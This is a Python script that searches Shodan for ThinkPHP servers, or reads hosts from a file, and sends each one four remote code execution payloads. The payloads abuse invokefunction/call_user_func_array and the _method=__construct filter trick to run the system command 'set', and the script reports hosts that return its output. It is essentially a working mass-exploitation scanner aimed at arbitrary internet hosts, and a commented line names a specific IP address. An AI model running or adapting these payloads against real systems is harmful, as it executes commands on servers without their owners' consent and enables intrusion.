
import requests
from shodan import Shodan

data_route = "/index.php?s=index/\think\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=set"
data_5010 = "s=set&filter%5B%5D=system&_method=__construct&method="
data_5023 = "_method=__construct&filter[]=system&method=GET&get[]=set"
data_5152 = "c=system&f=set&&_method=filter&"

headers = {
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:64.0) Gecko/20100101 Firefox/64.0',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
    'Accept-Language': 'en-US,en;q=0.5',
    'Accept-Encoding': 'gzip, deflate',
    'Content-Type': 'application/x-www-form-urlencoded', 
}

def check_route(url):
    r = requests.get(url+data_route,headers=headers,timeout=1)
    s = r.text.replace(" ","").lower()
    if "path=" in s and "user" in s:
        print(r.url,"route Vulnerable")
    else:
        print(url,"checked")


def check5010(url):   
    r = requests.post(url+"/index.php?s=index/index/index/",data=data_5010,headers=headers,timeout=1)
    s = r.text.replace(" ","").lower()
    if "path=" in s and "user" in s:
        print(r.url,"5010 Vulnerable")
    else:
        print(url,"checked")

def check5023(url):
    r = requests.post(url+"/index.php?s=captcha",data=data_5023,headers=headers,timeout=1)
    s = r.text.replace(" ","").lower()
    if "path=" in s and "user" in s:
        print(r.url,"5023 Vulnerable")
    else:
        print(url,"checked")
        

def check5152(url):
    r = requests.post(url+"/index.php",data=data_5152,headers=headers,timeout=1)
    s = r.text.replace(" ","").lower()
    if "path=" in s and "user" in s:
        print(r.url,"5152 Vulnerable")
    else:
        print(url,"checked")
    
def apicheck():  
    api = Shodan('key')
    try:
        # Search Shodan
        results = api.search('thinkphp')
        # Show the results
        print('Results found: {}'.format(results['total']))
        for result in results['matches']:
                url = "http://" + result['ip_str']  
                checkall(url)        
    except:pass

def filecheck():
    for line in open("./Desktop/dd.txt","r"):
        line = line.strip("\r\n")
        checkall("http://"+line)
        
def checkall(url):
    try:
        check5010(url)
        check5023(url)
        check5152(url)
        check_route(url)
    except:pass

if __name__ == "__main__":
    apicheck()
    #filecheck()
    #checkall("http://119.29.239.197 ")
    
